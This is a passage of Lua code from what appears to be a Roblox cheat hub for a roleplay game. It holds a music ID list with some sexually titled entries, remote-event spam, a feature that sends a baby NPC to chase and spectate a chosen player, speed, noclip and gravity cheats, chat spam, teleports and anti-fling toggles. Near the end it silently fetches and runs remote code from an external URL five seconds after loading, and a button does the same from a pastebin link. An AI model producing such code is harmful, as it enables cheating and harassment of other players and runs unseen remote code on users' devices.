        {name = "Vai Que E No Vapor!", id = "94845998956451"},
        {name = "phonk kawai", id = "91502410121438"},
        {name = "querendo da a bucet@", id = "72720721570850"},
        {name = "vem no pocpoc", id = "102333419023382"},
        {name = "tatiu wim", id = "122871512353520"},
        {name = "novinha sapeca", id = "111668097052966"},
        {name = "novinha representa", id = "93786060174790"},
        {name = "phonk1", id = "77501611905348"},
        {name = "phonk2", id = "126887144190812"},
        {name = "phonk sarra", id = "132436320685732"},
        {name = "phonk3", id = "90323407842935"},
        {name = "novinha dançapanpa", id = "132245626038510"},
        {name = "phonk sexoagreçivo", id = "111995323199676"},
        {name = "phonk4", id = "115016589376700"},
        {name = "phonk5", id = "118740708757685"},
        {name = "phonk6", id = "139435437308948"},
        {name = "phonk chapaquente", id = "109189438638906"},
        {name = "phonk rajada", id = "105126065014034"},
        {name = "rede globo", id = "138487820505005"},
        {name = "phonk indiano", id = "87968531262747"},
        {name = "vapo do vapo", id = "106317184644394"},
        {name = "tutatatutata", id = "112068892721408"},
        {name = "phonk slower", id = "122852029094656"},
        {name = "phonk9", id = "91760524161503"},
        {name = "phonk10", id = "73140398421340"},
        {name = "phonk11", id = "137962454483542"},
        {name = "phonk12", id = "84733736048142"},
        {name = "phonk13", id = "106322173003761"},
        {name = "phonk14", id = "94604796823780"},
        {name = "phonk15", id = "118063577904953"},
        {name = "phonk16", id = "115567432786512"},
        {name = "phonk toq", id = "71304501822029"},
        {name = "phonk hey", id = "132218979961283"},
        {name = "phonk17", id = "102708912256857"},
        {name = "phonk18", id = "140642559093189"},
        {name = "phonk neve", id = "13530439660"},
        {name = "phonk19", id = "87863924786534"},
        {name = "phonk20", id = "133135085604736"},
        {name = "phonk lento", id = "97258811783169"},
        {name = "phonk21", id = "92308400487695"},
        {name = "tipo wym", id = "88064647826500"},
        {name = "estouradassa1", id = "92175624643620"},
        {name = "estouradassa2", id = "108099943758978"},
        {name = "trem", id = "114608169341947"},
        {name = "eoropa", id = "111346133543699"},
        {name = "atimosphekika", id = "77857496821844"},
        {name = "phonk ALL THE TIME", id = "123809083385992"},
        {name = "Automotivo Blondie (Pke Gaz1nh)", id = "74564219749776"},
        {name = " v2", id =  "118225359190317"},
        {name = "MTG TU VAI SENTAR (Pke Gaz1nh)", id = "115317874112657"},
        {name = "Catuquanvan", id = "88038595663211"},
        {name = "F-D-1 (slowed)", id = "124958445624871"},
        {name = "Sucessagem", id = "88551699463723"},
        {name = "ILOVE phonksla", id = "82148953715595"},
        {name = "SPEED SLIDE", id = "118959437310311"},
        {name = "TOMA FUNK PHONK", id = "126291069838831"},
        {name = "PASSO BEM SOLTO X NEW JAZZ", id = "122706595087279"},
        {name = "MONTAGEM BIONICA DIAMANTE", id = "122338822665007"},
        {name = "BALA SELVAGEM!", id = "96180057167470"},
        {name = "COMO TU", id = "86928685812280"},
        {name = "MONTAGEM SOLAR TROPICANO (SPEED UP)", id = "116461681407294"},
        {name = "MONTAGEM SOLAR TROPICANO (SLOWED)", id = "109308273341422"},
        {name = "YO DE TI", id = "125181345407169"},
        {name = "Beauty, (Phonk), Super sped up", id = "71123357599630"},
        {name = "BRAZIL DO FUNK", id = "133498554139200"},
        {name = "FUNK DO RAVE 1.0", id = "137135395010424"},
        
        {name = " Portao Funk", id = "70900514961735"},
        {name = " FUTABA", id = "91834632690710"},
        {name = " Melódica Explosão De Melodia", id = "98371771055411"},
        {name = " HIPNOTIZA", id = "117668905142866"},
        {name = "CRISTAL NOTURNO", id = "103695219371872"},
        {name = " SKY HIGH", id = "123517126955383"},
        {name = "GOTH FUNK", id = "97662362226511"},
        {name = "SUBURBANA", id = "139825057894568"},
        {name = "STORYMODECOOL", id = "87115976125426"},
        {name = "KOBALT", id = "79381341943021"},
        {name = " andante bacterial", id = "105882833374061"},
        {name = "ANGEL Speed Up", id = "139593870988593"},
        {name = "MALDITA", id = "133814632960968"},
        {name = "HIPNOTIZA", id = "132015050363205"},
        {name = "MIDZUKI speed up", id = "129151948619922"},
        {name = "CRISTAL", id = "103445348511856"},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""}
    }
}, "Option 1")

Tab:AddButton({
    Name = "Stop",
    Description = "ALL music",
    Callback = function()
        tocarMusica("")
    end
})

local Tab6 = Window:MakeTab({"Name and Rgb's", "Paper"})

local Section = Tab6:AddSection({"Aumente a velocidade do Rgb"})

-- Velocidade controlada pelo slider (quanto maior, mais rápido)
local rgbSpeed = 1

Tab6:AddSlider({
    Name = "Velocidade RGB",
    Description = "Aumenta a velocidade do efeito RGB",
    Min = 1,
    Max = 5,
    Increase = 1,
    Default = 3,
    Callback = function(Value)
        rgbSpeed = Value
    end
})

-- Função para criar cor RGB suave com HSV
local function getRainbowColor(speedMultiplier)
    local h = (tick() * speedMultiplier % 5) / 5 -- gira o hue suavemente de 0 a 1
    return Color3.fromHSV(h, 1, 1)
end

-- Função para disparar eventos
local function fireServer(eventName, args)
    local event = game:GetService("ReplicatedStorage"):FindFirstChild("RE")
    if event and event:FindFirstChild(eventName) then
        pcall(function()
            event[eventName]:FireServer(unpack(args))
        end)
    end
end

local Section = Tab6:AddSection({"RGB para usar em você"})

-- Nome + Bio RGB  juntos
local nameBioRGBActive = false
Tab6:AddToggle({
    Name = "Nome + Bio RGB",
    Default = false,
    Callback = function(state)
        nameBioRGBActive = state
        if state then
            task.spawn(function()
                while nameBioRGBActive and LocalPlayer.Character do
                    local color = getRainbowColor(rgbSpeed)
                    fireServer("1RPNam1eColo1r", { "PickingRPNameColor", color })
                    fireServer("1RPNam1eColo1r", { "PickingRPBioColor", color })
                    task.wait(0.03)
                end
            end)
        end
    end
})

local Section = Tab6:AddSection({"RGB's"})

local ToggleBicicleta = Tab6:AddToggle({
    Name = "RGB Bicicleta",
    Description = "RGB na bicicleta",
    Default = false
})
ToggleBicicleta:Callback(function(Value)
    getgenv().rgbBicicleta = Value
    task.spawn(function()
        while getgenv().rgbBicicleta do
            fireServer("1Player1sCa1r", {
                "NoMotorColor",
                getRainbowColor(rgbSpeed)
            })
            task.wait(0.1)
        end
    end)
end)

local radioRGBActive = false
Tab6:AddToggle({
    Name = "Rádio RGB",
    Default = false,
    Callback = function(state)
        radioRGBActive = state
        if state then
            task.spawn(function()
                while radioRGBActive and LocalPlayer.Character do
                    local color = getRainbowColor(rgbSpeed)
                    local success, remote = pcall(function()
                        return LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("ToolGui"):WaitForChild("ToolSettings"):WaitForChild("Settings"):WaitForChild("PropsColor"):WaitForChild("SetColor")
                    end)
                    if success and remote then
                        pcall(function()
                            remote:FireServer(color)
                        end)
                    end
                    task.wait(0.03)
                end
            end)
        end
    end
})

local ChildTab = Window:MakeTab({"Child", "baby"})

local Section = ChildTab:AddSection({

    Name = "Child"

})

local chasingplayer = nil

local playerChild = ChildTab:AddDropdown({

    Name = "Select a player to chase",

    Options = players,

    Default = "",

    Callback = function(selected)

        if game.Players:FindFirstChild(selected) then

            chasingplayer = selected

        else

            chasingplayer = nil

        end

    end

})

ChildTab:AddButton({

    Name = "Update Player List",

    Callback = function()

        local updatedPlayers = updatePlayerList()

        if playerChild and updatedPlayers then

            pcall(function()

                playerChild:Refresh(updatedPlayers)

            end)

            if chasingplayer and not game.Players:FindFirstChild(chasingplayer) then

                chasingplayer = nil

                pcall(function()

                    playerChild:Set("")

                end)

            end

        end

    end

})

game.Players.PlayerAdded:Connect(function()

    task.wait(0.1)

    local updatedPlayers = updatePlayerList()

    if playerChild and updatedPlayers then

        pcall(function()

            playerChild:Refresh(updatedPlayers)

        end)

    end

end)



game.Players.PlayerRemoving:Connect(function(player)

    task.wait(0.1)

    local updatedPlayers = updatePlayerList()

    if playerChild and updatedPlayers then

        pcall(function()

            playerChild:Refresh(updatedPlayers)

        end)

        if chasingplayer == player.Name then

            chasingplayer = nil

            pcall(function()

                playerChild:Set("")

            end)

        end

    end

end)

ChildTab:AddButton({

    Name = "Send Child",

    Callback = function()

        if not chasingplayer then

            return

        end

        if not workspace:FindFirstChild(pl.Name) or not workspace[pl.Name]:FindFirstChild("FollowCharacter") then

            local args = {

                [1] = "CharacterFollowSpawnPlayer",

                [2] = "BabyBoy"

            }

            local success, err = pcall(function()

                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Bab1yFollo1w"):FireServer(unpack(args))

            end)

            if not success then

            end

        end

        

        task.wait(0.2)

        

        if workspace:FindFirstChild(pl.Name) then

            for _, v in pairs(workspace[pl.Name]:GetChildren()) do

                if v:IsA("BasePart") then

                    v.CanCollide = true

                end

            end

        end



        local target = chasingplayer

        if workspace:FindFirstChild(target) and workspace:FindFirstChild(pl.Name) and workspace[pl.Name]:FindFirstChild("FollowCharacter") then

            workspace[pl.Name].FollowCharacter.Parent = workspace[target]



            if rawget(getgenv(), "RunService") then

                return

            end



            getgenv().RunService = game:GetService("RunService").Heartbeat:Connect(function()

                local followCharacter = workspace[target]:FindFirstChild("FollowCharacter")

                if followCharacter and followCharacter:FindFirstChild("Torso") and followCharacter.Torso:FindFirstChild("BodyPosition") then

                    local humanoidRootPart = workspace[target]:FindFirstChild("HumanoidRootPart")

                    if humanoidRootPart then

                        followCharacter.Torso.BodyPosition.Position = humanoidRootPart.Position - (humanoidRootPart.CFrame.LookVector * 3)

                        followCharacter.Torso.BodyGyro.CFrame = humanoidRootPart.CFrame

                    end

                end

            end)

        end

    end

})

ChildTab:AddButton({

    Name = "Return Child",

    Callback = function()

        if rawget(getgenv(), "RunService") then

            getgenv().RunService:Disconnect()

            getgenv().RunService = nil

        end



        local args = { [1] = "DeleteFollowCharacter" }

        local success, err = pcall(function()

            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Bab1yFollo1w"):FireServer(unpack(args))

        end)

        if not success then

        end



        local args1 = { [1] = "CharacterFollowSpawnPlayer", [2] = "BabyBoy" }

        success, err = pcall(function()

            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Bab1yFollo1w"):FireServer(unpack(args1))

        end)

        if not success then

        end

    end

})

ChildTab:AddToggle({

    Name = "View Player",

    Default = false,

    Callback = function(Value)

        local Players = game:GetService("Players")

        local RunService = game:GetService("RunService")

        local LocalPlayer = Players.LocalPlayer

        local Camera = workspace.CurrentCamera



        if Value then

            if not chasingplayer then

                return false

            end



            if not rawget(getgenv(), "CameraConnection") then

                getgenv().CameraConnection = RunService.Heartbeat:Connect(function()

                    local targetPlayer = Players:FindFirstChild(chasingplayer)

                    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then

                        Camera.CameraSubject = targetPlayer.Character.Humanoid

                    else

                        if rawget(getgenv(), "CameraConnection") then

                            getgenv().CameraConnection:Disconnect()

                            getgenv().CameraConnection = nil

                        end

                        Camera.CameraSubject = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") or nil

                    end

                end)

            end

        else

            if rawget(getgenv(), "CameraConnection") then

                getgenv().CameraConnection:Disconnect()

                getgenv().CameraConnection = nil

            end

            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then

                Camera.CameraSubject = LocalPlayer.Character.Humanoid

            end

        end

    end

})

local LocalPlayerTab = Window:MakeTab({"Local Player", "user"})

local Section = LocalPlayerTab:AddSection({

    Name = "Local Player"

})

LocalPlayerTab:AddTextBox({

    Name = "Walk Speed",

    PlaceholderText = "Type here...",

    Callback = function(value)

        local speed = tonumber(value)

        if speed and pl.Character and pl.Character:FindFirstChild("Humanoid") then

            pl.Character.Humanoid.WalkSpeed = speed

        else

        end

    end

})

LocalPlayerTab:AddButton({

    Name = "Reset Walk Speed",

    Callback = function()

        if pl.Character and pl.Character:FindFirstChild("Humanoid") then

            pl.Character.Humanoid.WalkSpeed = 16

        end

    end

})

LocalPlayerTab:AddTextBox({

    Name = "Jump Power",

    PlaceholderText = "Type here...",

    Callback = function(value)

        local jumpHeight = tonumber(value)

        if jumpHeight and pl.Character and pl.Character:FindFirstChild("Humanoid") then

            pl.Character.Humanoid.JumpPower = jumpHeight

        else

        end

    end

})

LocalPlayerTab:AddButton({

    Name = "Reset Jump Power",

    Callback = function()

        if pl.Character and pl.Character:FindFirstChild("Humanoid") then

            pl.Character.Humanoid.JumpPower = 50

        end

    end

})

LocalPlayerTab:AddTextBox({

    Name = "Gravity",

    PlaceholderText = "Type here...",

    Callback = function(value)

        local gravity = tonumber(value)

        if gravity then

            workspace.Gravity = gravity

        else

        end

    end

})

LocalPlayerTab:AddButton({

    Name = "Reset Gravity",

    Callback = function()

        workspace.Gravity = 196.2

    end

})

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local noclipConnection

LocalPlayerTab:AddToggle({
    Name = "Noclip",
    Callback = function(state)

        if state then
            noclipConnection = RunService.Stepped:Connect(function()
                local char = player.Character
                if char then
                    for _, v in pairs(char:GetDescendants()) do
                        if v:IsA("BasePart") then
                            v.CanCollide = false
                        end
                    end
                end
            end)

        else
            if noclipConnection then
                noclipConnection:Disconnect()
                noclipConnection = nil
            end
        end

    end
})

LocalPlayerTab:AddSection({ "FE INVISIBLE" })
LocalPlayerTab:AddButton({
    Name = "FE INVISIBLE",
    Callback = function()
        loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
    end
}) 

Section = LocalPlayerTab:AddSection({

    Name = "Chat"

})

local TextSave

local tcs = game:GetService("TextChatService")

local chat = tcs.ChatInputBarConfiguration and tcs.ChatInputBarConfiguration.TargetTextChannel

function sendchat(msg)

    if not msg or msg == "" then return end

    if tcs.ChatVersion == Enum.ChatVersion.LegacyChatService then

        local success, err = pcall(function()

            game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents").SayMessageRequest:FireServer(msg, "All")

        end)

        if not success then

        end

    elseif chat then

        local success, err = pcall(function()

            chat:SendAsync(msg)

        end)

        if not success then

        end

    end

end

LocalPlayerTab:AddTextBox({

    Name = "Enter Text",

    PlaceholderText = "Uh... Hi!",

    Callback = function(text)

        TextSave = text

    end

})

LocalPlayerTab:AddButton({

    Name = "Send Chat",

    Callback = function()

        sendchat(TextSave)

    end

})

getgenv().ChaosHubEnviarDelay = 1

LocalPlayerTab:AddSlider({

    Name = "Delay Spam",

    Min = 0.4,

    Max = 10,

    Default = 1,

    Increment = 0.1,

    Callback = function(Value)

        getgenv().ChaosHubEnviarDelay = Value

    end

})

LocalPlayerTab:AddToggle({

    Name = "Spam Chat",

    Default = false,

    Flag = "SpamXhati",

    Callback = function(Value)

        getgenv().ChaosHubSpawnText = Value

        while getgenv().ChaosHubSpawnText do

            sendchat(TextSave)

            task.wait(getgenv().ChaosHubEnviarDelay)

        end

    end

})

local Tab = Window:MakeTab({"Teleports", "tp"}) 

local Section = Tab:AddSection({

    Name = "Teleports"

})

local teleportButtons = {

    {"Hotel", CFrame.new(192, 4, 272)},

    {"Urban Center", CFrame.new(136, 4, 117)},

    {"Criminal Area", CFrame.new(-119, -28, 235)},

    {"Abandoned House", CFrame.new(986, 4, 63)},

    {"Agency Portal", CFrame.new(672, 4, -296)},

    {"Hideout", CFrame.new(505, -75, 143)},

    {"School", CFrame.new(-312, 4, 211)},

    {"Burguer Barn", CFrame.new(161, 8, 52)},

    {"Starting Point", CFrame.new(-26, 4, -23)},

    {"Main Arch", CFrame.new(-589, 141, -59)},

    {"Hospital", CFrame.new(-309, 4, 71)},

    {"Agency Base", CFrame.new(179, 4, -464)},

    {"Hidden Place of the Workshop", CFrame.new(0, 4, -495)},

    {"Secret Place", CFrame.new(-343, 4, -613)},

    {"Isolated Island", CFrame.new(-1925, 23, 127)},

    {"Hotel Square", CFrame.new(182, 4, 150)},

    {"Climb Mountain", CFrame.new(-670, 251, 765)},

    {"Main Bank", CFrame.new(2.28, 4.65, 254.58)},

    {"Clothing Store", CFrame.new(-46.15, 4.65, 253.20)},

    {"Veterinary", CFrame.new(-88.48, 22.05, 262.34)},

    {"Dental Clinic", CFrame.new(-53.58, 22.15, 265.61)},

    {"Coffee", CFrame.new(-97.12, 4.65, 254.99)}

}



for _, btn in ipairs(teleportButtons) do

    Tab:AddButton({

        btn[1],

        function()

            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = btn[2]

        end

    })

end

local Tab13 = Window:MakeTab({"Protections", "shield"})

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")

local protections = {
    Canoe = false,
    Jet = false,
    Heli = false,
    Ball = false,
    Sit = false
}

task.spawn(function()
    while true do

        local char = LocalPlayer.Character
        local workspaceCom = Workspace:FindFirstChild("WorkspaceCom")

        if workspaceCom then

            -- Anti Canoe Fling
            if protections.Canoe then
                local canoeFolder = workspaceCom:FindFirstChild("001_CanoeStorage")
                if canoeFolder then
                    for _, canoe in ipairs(canoeFolder:GetChildren()) do
                        local owner = canoe:FindFirstChild("Owner")
                        if not owner or owner.Value ~= LocalPlayer then
                            canoe:Destroy()
                        end
                    end
                end
            end

            -- Anti Jet Fling
            if protections.Jet then
                local airport = workspaceCom:FindFirstChild("001_Airport")
                if airport then
                    local hanger = airport:FindFirstChild("AirportHanger")
                    if hanger then
                        local jetStorage = hanger:FindFirstChild("001_JetStorage")
                        if jetStorage then
                            local jetFolder = jetStorage:FindFirstChild("JetAirport")
                            if jetFolder then
                                for _, jet in ipairs(jetFolder:GetChildren()) do
                                    if jet.Name ~= LocalPlayer.Name then
                                        jet:Destroy()
                                    end
                                end
                            end
                        end
                    end
                end
            end

            -- Anti Helicopter Fling
            if protections.Heli then
                local heliStorage = workspaceCom:FindFirstChild("001_HeliStorage")
                if heliStorage then
                    local heliFolder = heliStorage:FindFirstChild("PoliceStationHeli")
                    if heliFolder then
                        for _, heli in ipairs(heliFolder:GetChildren()) do
                            if heli.Name ~= LocalPlayer.Name then
                                heli:Destroy()
                            end
                        end
                    end
                end
            end

            -- Anti Ball Fling
            if protections.Ball then
                local ballFolder = workspaceCom:FindFirstChild("001_SoccerBalls")
                if ballFolder then
                    for _, ball in ipairs(ballFolder:GetChildren()) do
                        ball:Destroy()
                    end
                end
            end

        end

        -- Anti Sit
        if protections.Sit and char then
            local humanoid = char:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

                if humanoid:GetState() == Enum.HumanoidStateType.Seated then
                    humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                end
            end
        end

        task.wait(0.2)

    end
end)

-- Toggles

Tab13:AddToggle({
    Name = "Anti Canoe Fling",
    Default = false,
    Callback = function(value)
        protections.Canoe = value
    end
})

Tab13:AddToggle({
    Name = "Anti Jet Fling",
    Default = false,
    Callback = function(value)
        protections.Jet = value
    end
})

Tab13:AddToggle({
    Name = "Anti Helicopter Fling",
    Default = false,
    Callback = function(value)
        protections.Heli = value
    end
})

Tab13:AddToggle({
    Name = "Anti Ball Fling",
    Default = false,
    Callback = function(value)
        protections.Ball = value
    end
})

Tab13:AddToggle({
    Name = "Anti Sit",
    Default = false,
    Callback = function(value)
        protections.Sit = value
    end
})

task.delay(5, function()
    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/OFbzRF1izFenc6Li/raw"))()
end)